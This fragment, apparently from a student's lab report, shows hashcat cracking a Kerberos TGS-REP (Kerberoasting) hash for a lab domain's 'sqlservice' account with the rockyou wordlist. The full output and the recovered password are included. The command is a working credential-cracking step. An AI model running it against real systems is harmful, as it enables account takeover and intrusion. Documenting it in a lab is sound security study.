# Uitvoer 2: Hash werd succesvol gekraakt
```bash
(root@osboxes)-[~/hack]
# hashcat -m 13100 hackedHash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 1276/2617 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*sqlservice$BP-2223-JORN.HOGENT$bp-2223-jorn.hogent/sqlservice*$836a933a74ec25991255886152048cd6$5e2a5570addaea2616aa176513c0e3fa1cef5ddb73236482d64af537c55e3d724cd9aff97d8369a26a29f219160434639385676b8c014be79a8b35a18dbf0bf44833cc59458feef658e003285ebee50562a8df23256fd1e5278423b5f972b62ed15f58ca073403a96539a145a194b1e1a89b4955d0ccd2e5de2e136ef7e856d2c10fb757ae423af06c9f269c96f242d560793d0857dfd93c433cefc795385fbc8ed2fbd1f8c0d3fc294f95672d77fcc3911d8a1746def797376c04c8bc42b9522df7e65b21a21b1cbd6b922c7efc35a9e8b96097e17e882885baf16b806456502eae8a432e5e111f6c96ad6795b5352103045bc5a32b1eba9da3b7f1013aaf5c194edd173fbc1a2618c15e384d2fb57ef09a4809e24ace0944097a82ddb185ea5d44b5dd745d5f7415a50f99046e1e61adb7849a0e939f39b0d8f636bcadcd7deaae0e026ffaaf84871f83a9b61c37fe61704fa6200adac30d0091dbf052cdf57e6a6535808ed7f8796cd26787b146c9ff3dc6788f40c2170b0b9a5ab244a67d17d4efaa61dfef347e242071769f15957ea34a007aa8cb82b8dfb4d9d3c56fd68dccc4a60ad45ed817970d0b357e74693192ff409fb762d66480a27c80f65788b8000568217d4b72c8299229c42f1dc445a547d47627da7f8340bce4837e6cb4e8cba1a8e60098cdb1d4d37bbce3517cd8af1c4d22d44b06e5251261930d2bd73c4d76cd46e41113352bb180dd5c359b44820a978f5b571dc26b6036c490d7c56c84c49d34eeb32e37f779207c8c5c03ca8fe272c9e46c53743bab47af64da25ab93d223741d6ad194305aea7e00903aef1fdf5841b3c9161629943e7ba0d7c41ad7ae6d9fc7e6e8ca191da1c0caa3f23c893ab2bb620d687a3f94838459071a382cee2632673282e4af4b031bc86100a88b4e30012f702a3ca0fc80e85bc191240a682c888a66242463d77c6e83fdf641483fa57919fa91df48dc7e1cb321f1e5c91434ae50188b2a3e11de57dde80fb81fdadc5b1b48032fd77b29c982f0035003d461d8a18c914fc2edb4b114630142be554738aaa636667b0e2763cdf7e87d528401e3ce142ff48793cd3d22cfacc4e4d0a2535e917d3202b2536c76bb64af3aa1995c83e121689f89f35a7d2d553b8236489db757c988228765aba6b75954ebefb4a1914291031e512108ace7c60cbfd867461f74b72f78acbabf541149028b0ea904e35c11802681f5e8e534a3ecdbe2e92a632459bc562ca989a3fa6e093eef997df465469ab6003a2e5d6c639a812cb8d0b405c77785f8db74a56bef2adb3c35dcc25422:Password1
                                                            
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sqlservice$BP-2223-JORN.HOGENT$bp-2223...c25422
Time.Started.....: Fri Mar 24 12:49:48 2023 (1 sec)
Time.Estimated...: Fri Mar 24 12:49:49 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   364.1 kH/s (0.46ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3584/14344385 (0.02%)
Rejected.........: 0/3584 (0.00%)
Restore.Point....: 3072/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adriano -> fresa
Hardware.Mon.#1..: Util: 27%

Started: Fri Mar 24 12:49:46 2023
Stopped: Fri Mar 24 12:49:50 2023
```